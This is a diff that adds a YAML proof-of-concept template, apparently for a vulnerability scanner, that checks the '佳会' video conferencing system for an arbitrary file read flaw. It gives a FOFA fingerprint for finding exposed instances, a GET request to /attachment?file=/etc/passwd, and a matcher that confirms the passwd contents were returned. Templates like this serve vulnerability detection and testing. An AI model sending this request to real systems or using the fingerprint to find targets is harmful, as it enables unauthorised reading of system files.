@@ -1,0 +1,15 @@
+id: poc-yaml-santi-attachment-anyfile-read
+info:
+  name: 叁体-佳会视频会议 attachment 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 佳会视频会议
+  fofa: body="/system/get_rtc_user_defined_info?site_id"
+requests:
+- method: GET
+  path: /attachment?file=/etc/passwd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\n!contains(body,\"<\") &&\ncontains(headers,\"filename=passwd\")\n"
+variables: {}
+transport: http
